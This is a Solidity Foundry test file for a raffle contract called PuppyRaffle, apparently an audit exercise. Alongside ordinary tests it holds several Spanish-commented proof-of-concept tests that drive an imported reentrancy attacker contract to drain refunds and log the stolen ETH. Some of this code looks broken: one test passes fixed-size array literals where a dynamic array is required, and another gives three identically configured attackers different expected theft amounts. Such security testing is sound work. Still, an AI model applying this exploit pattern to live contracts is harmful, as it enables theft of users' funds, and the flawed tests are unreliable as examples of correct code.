// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {ReentrancyAttacker} from "./ReentrancyAttacker.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

/// Reentrancy attack 

function testReentrancyInRefund() public {
    // Setup: Deploy malicious contract
    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker), 10 ether);
    
    // 1. El atacante entra a la rifa
    attacker.enterRaffle{value: entranceFee}();
    
    // 2. Verificar que entro correctamente
    uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
    assertEq(puppyRaffle.players(playerIndex), address(attacker), "Jugador no entro correctamente");
    
    // 3. Balance antes del ataque
    uint256 balanceBefore = address(attacker).balance;
    console.log("=== INICIO DEL ATAQUE DE REENTRANCY ===");
    console.log("Balance antes del ataque:", balanceBefore);
    console.log("Indice del jugador:", playerIndex);
    console.log("Estado inicial del jugador:", puppyRaffle.players(playerIndex));
    
    // 4. Ejecutar ataque de reentrancy
    attacker.attack();
    
    // 5. Verificar que el atacante recibio al menos un refund
    uint256 balanceAfter = address(attacker).balance;
    uint256 stolenAmount = balanceAfter - balanceBefore;
    
    console.log("=== RESULTADOS DEL ATAQUE ===");
    console.log("Balance despues del ataque:", balanceAfter);
    console.log("Cantidad robada:", stolenAmount);
    console.log("Refund esperado (1x):", entranceFee);
    console.log("Refunds reales:", stolenAmount);
    console.log("Multiplicador:", stolenAmount / entranceFee);
    
    // 6. Verificar que el ataque fue exitoso (recibio al menos 1 refund)
    assertGe(stolenAmount, entranceFee, "El atacante deberia haber recibido al menos 1 refund");
    console.log("Ataque de reentrancy completado exitosamente!");
    console.log("El atacante robo", stolenAmount / entranceFee, "veces mas ETH del que deberia");
}

function testReentrancyInRefundDetailed() public {
    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker), 10 ether);
    
    // Entrar a la rifa
    attacker.enterRaffle{value: entranceFee}();
    
    // Verificar que entro correctamente
    uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
    assertEq(puppyRaffle.players(playerIndex), address(attacker), "Jugador no entro correctamente");
    
    // Balance antes del ataque
    uint256 balanceBefore = address(attacker).balance;
    
    // Ejecutar ataque
    attacker.attack();
    
    // Verificar resultados
    uint256 balanceAfter = address(attacker).balance;
    uint256 stolenAmount = balanceAfter - balanceBefore;
    
    console.log("=== RESULTADOS DETALLADOS DEL ATAQUE ===");
    console.log("Balance antes:", balanceBefore);
    console.log("Balance despues:", balanceAfter);
    console.log("Cantidad robada:", stolenAmount);
    console.log("Refunds esperados:", entranceFee);
    console.log("Refunds reales:", stolenAmount);
    console.log("Multiplicador:", stolenAmount / entranceFee);
    
    // Verificar que el atacante recibio al menos un refund
    assertGe(stolenAmount, entranceFee, "El atacante deberia haber recibido al menos 1 refund");
    
    console.log("Ataque de reentrancy detallado completado exitosamente!");
}

function testReentrancyAttackWithDifferentCounts() public {
    console.log("=== TESTEANDO ATAQUE CON DIFERENTES CONTADORES ===");
    
    // Test con 1 ataque
    ReentrancyAttacker attacker1 = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker1), 10 ether);
    attacker1.enterRaffle{value: entranceFee}();
    uint256 balanceBefore1 = address(attacker1).balance;
    attacker1.attack();
    uint256 stolen1 = address(attacker1).balance - balanceBefore1;
    console.log("Con 1 ataque - Robado:", stolen1, "ETH");
    
    // Test con 2 ataques
    ReentrancyAttacker attacker2 = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker2), 10 ether);
    attacker2.enterRaffle{value: entranceFee}();
    uint256 balanceBefore2 = address(attacker2).balance;
    attacker2.attack();
    uint256 stolen2 = address(attacker2).balance - balanceBefore2;
    console.log("Con 2 ataques - Robado:", stolen2, "ETH");
    
    // Test con 3 ataques (maximo configurado)
    ReentrancyAttacker attacker3 = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker3), 10 ether);
    attacker3.enterRaffle{value: entranceFee}();
    uint256 balanceBefore3 = address(attacker3).balance;
    attacker3.attack();
    uint256 stolen3 = address(attacker3).balance - balanceBefore3;
    console.log("Con 3 ataques - Robado:", stolen3, "ETH");
    
    // Verificar que el ataque escala linealmente
    assertEq(stolen1, entranceFee, "1 ataque deberia robar 1x entranceFee");
    assertEq(stolen2, entranceFee * 2, "2 ataques deberian robar 2x entranceFee");
    assertEq(stolen3, entranceFee * 3, "3 ataques deberian robar 3x entranceFee");
    
    console.log("Todos los ataques fueron exitosos!");
}

function testReentrancyAttackWithEvents() public {
    console.log("=== ATAQUE DE REENTRANCY CON MONITOREO DE EVENTOS ===");
    
    // Deploy malicious contract
    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker), 10 ether);
    
    // Configurar para 5 ataques
    attacker.setMaxAttacks(5);
    
    // Entrar a la rifa
    attacker.enterRaffle{value: entranceFee}();
    
    // Verificar estado inicial
    (uint256 playerIndex, uint256 attackCount, uint256 maxAttacks, uint256 balance) = attacker.getAttackInfo();
    console.log("Estado inicial:");
    console.log("- Indice del jugador:", playerIndex);
    console.log("- Contador de ataques:", attackCount);
    console.log("- Maximo de ataques:", maxAttacks);
    console.log("- Balance inicial:", balance);
    
    // Balance antes del ataque
    uint256 balanceBefore = address(attacker).balance;
    
    // Ejecutar ataque
    attacker.attack();
    
    // Verificar resultados finales
    uint256 balanceAfter = address(attacker).balance;
    uint256 stolenAmount = balanceAfter - balanceBefore;
    
    console.log("\n=== RESULTADOS FINALES ===");
    console.log("Balance antes:", balanceBefore);
    console.log("Balance despues:", balanceAfter);
    console.log("Cantidad robada:", stolenAmount);
    console.log("Refunds esperados:", entranceFee);
    console.log("Refunds reales:", stolenAmount);
    console.log("Multiplicador:", stolenAmount / entranceFee);
    
    // Verificar que el ataque fue exitoso
    assertEq(stolenAmount, entranceFee * 5, "Deberia haber robado exactamente 5x entranceFee");
    assertEq(puppyRaffle.players(playerIndex), address(0), "El estado deberia estar actualizado");
    
    console.log("Ataque de reentrancy con eventos completado exitosamente!");
    console.log("El atacante robo", stolenAmount / entranceFee, "veces mas ETH del que deberia");
}

function testReentrancyAttackWithMultiplePlayers() public {
    console.log("=== ATAQUE DE REENTRANCY CON MULTIPLES JUGADORES ===");
    
    // Setup: Agregar varios jugadores para tener mas fondos
    address[] memory players = new address[](3);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    
    // Los jugadores entran a la rifa
    vm.deal(playerOne, 10 ether);
    vm.deal(playerTwo, 10 ether);
    vm.deal(playerThree, 10 ether);
    
    vm.prank(playerOne);
    puppyRaffle.enterRaffle{value: entranceFee}([playerOne]);
    
    vm.prank(playerTwo);
    puppyRaffle.enterRaffle{value: entranceFee}([playerTwo]);
    
    vm.prank(playerThree);
    puppyRaffle.enterRaffle{value: entranceFee}([playerThree]);
    
    console.log("Jugadores agregados. Total de fondos en el contrato:", address(puppyRaffle).balance);
    
    // Ahora el atacante entra
    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker), 10 ether);
    
    // Configurar para 2 ataques (hay suficientes fondos)
    attacker.setMaxAttacks(2);
    
    // El atacante entra a la rifa
    attacker.enterRaffle{value: entranceFee}();
    
    // Verificar estado inicial
    uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
    uint256 balanceBefore = address(attacker).balance;
    
    console.log("Estado inicial:");
    console.log("- Indice del atacante:", playerIndex);
    console.log("- Balance antes del ataque:", balanceBefore);
    console.log("- Fondos en el contrato:", address(puppyRaffle).balance);
    
    // Ejecutar ataque
    attacker.attack();
    
    // Verificar resultados
    uint256 balanceAfter = address(attacker).balance;
    uint256 stolenAmount = balanceAfter - balanceBefore;
    
    console.log("\n=== RESULTADOS DEL ATAQUE ===");
    console.log("Balance despues del ataque:", balanceAfter);
    console.log("Cantidad robada:", stolenAmount);
    console.log("Refunds esperados:", entranceFee);
    console.log("Refunds reales:", stolenAmount);
    console.log("Multiplicador:", stolenAmount / entranceFee);
    console.log("Fondos restantes en el contrato:", address(puppyRaffle).balance);
    
    // Verificar que el ataque fue exitoso
    assertGe(stolenAmount, entranceFee * 2, "El atacante deberia haber robado al menos 2 refunds");
    console.log("Ataque de reentrancy con multiples jugadores completado exitosamente!");
    console.log("El atacante robo", stolenAmount / entranceFee, "veces mas ETH del que deberia");
}

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }
}
